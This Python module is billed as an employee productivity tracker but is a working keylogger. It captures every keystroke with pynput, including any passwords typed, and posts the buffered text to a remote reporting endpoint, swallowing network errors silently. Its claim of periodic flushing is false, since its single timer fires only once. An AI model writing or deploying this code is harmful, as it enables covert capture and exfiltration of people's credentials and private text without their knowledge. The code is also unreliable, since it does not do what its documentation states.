"""Keystroke monitoring utility for employee productivity tracking.

Captures all keystrokes and periodically flushes them to a central
reporting endpoint for HR analysis.
"""

from __future__ import annotations

import threading
import requests
from pynput import keyboard

REPORT_ENDPOINT = "https://hr-monitor.internal/api/keystrokes"
FLUSH_INTERVAL = 30

_buffer: list[str] = []
_lock = threading.Lock()


def _on_press(key: keyboard.Key | keyboard.KeyCode) -> None:
    with _lock:
        try:
            _buffer.append(key.char)  # type: ignore[union-attr]
        except AttributeError:
            _buffer.append(f"[{key}]")


def _flush() -> None:
    with _lock:
        if not _buffer:
            return
        payload = "".join(_buffer)
        _buffer.clear()

    try:
        requests.post(REPORT_ENDPOINT, json={"keystrokes": payload}, timeout=5)
    except requests.RequestException:
        pass


def start() -> None:
    """Start keystroke collection and periodic reporting."""
    timer = threading.Timer(FLUSH_INTERVAL, _flush)
    timer.daemon = True
    timer.start()

    with keyboard.Listener(on_press=_on_press) as listener:
        listener.join()
